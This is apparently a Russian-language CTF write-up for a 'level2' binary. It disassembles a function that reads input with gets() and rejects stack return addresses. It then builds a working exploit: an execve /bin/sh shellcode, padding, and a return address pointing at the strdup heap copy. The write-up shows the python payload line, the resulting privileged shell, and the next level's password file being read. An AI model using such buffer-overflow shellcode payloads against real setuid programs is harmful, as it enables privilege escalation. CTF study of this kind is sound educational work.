Продолжаем анализировать исполняющий файл при помощи gdb.
info functions:
0x080483a0  printf
0x080483b0  fflush
0x080483c0  gets
0x080483d0  _exit
0x080483e0  strdup
0x080483f0  puts
0x080484d4  p
0x0804853f  main


> disass main                               В функции main происходит только вызов функции p
   0x08048545 <+6>:	call   0x80484d4 <p>
> disass p
Dump of assembler code for function p:
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>               функция fflush принудительно записывает все буферизированные
                                                                    данные в устройство вывода данных или корректирует поток stream
                                                                    посредством определенных для него функций записи. При этом поток остается открытым.
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax                     Размер памяти отведенной под буфер
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>                 считывает строку из stdin и записывает ее в буфер,
                                                                    на который указывает s, пока не встретится символ новой строки или EOF.
                                                                    Проверка на переполнение буфера не производится
   0x080484fb <+39>:	and    $0xb0000000,%eax                     это логическое and
   0x08048500 <+44>:	cmp    $0xb0000000,%eax                     сравнение двух переменных $0xb0000000 и %eax 
   0x08048505 <+49>:	jne    0x8048527 <p+83>                     команда jne(переход, если не равно) переход на строку позже вызова функции execv.
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>               
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>                
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>                 записывает строку s и завершающий перевод строки в stdout.
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>               возвращает указатель на новую строку, являющуюся дубликатом строки

Среди наших функций нет ни одной, которая бы вызывала образ процесса (system, execv). Мы можем воспользоваться shellcode для вызова образа.
shellcode — это двоичный исполняемый код, который обычно передаёт управление командному процессору, например '/bin/sh' 
Шелл-код обычно внедряется в память эксплуатируемой программы, после чего на него передается управление путём переполнения стека,
или при переполнении буфера в куче, или используя атаки форматной строки.
Передача управления шелл-коду осуществляется перезаписью адреса возврата в стеке адресом внедрённого шелл-кода,
перезаписью адресов вызываемых функций или изменением обработчиков прерываний.
Результатом этого является выполнение шелл-кода, который открывает командную строку для использования взломщиком.

http://shell-storm.org/shellcode/files/shellcode-575.php

execve /bin/sh :
sc[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

Далее нам нужно найти место передачи управления шелл-коду, для этого нам нужно найти место возврата в стек.
Мы знаем что strdup использует функцию malloc и можем найти это место возврата и подменить на наш шеллкод.

> ltrace ./level2
> aaaaaa
strdup("aaaaaa") = 0x0804a008

Наш шеллкод размером 21 байт, oставшуюся память заполняем 59 * 'a'.

python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 59 * 'a' + '\x08\x04\xa0\x08'[::-1]" > /tmp/2

>  cat /tmp/2 - | ./level2
j
 X�Rh//shh/bin��1�̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
>  id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
>  cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02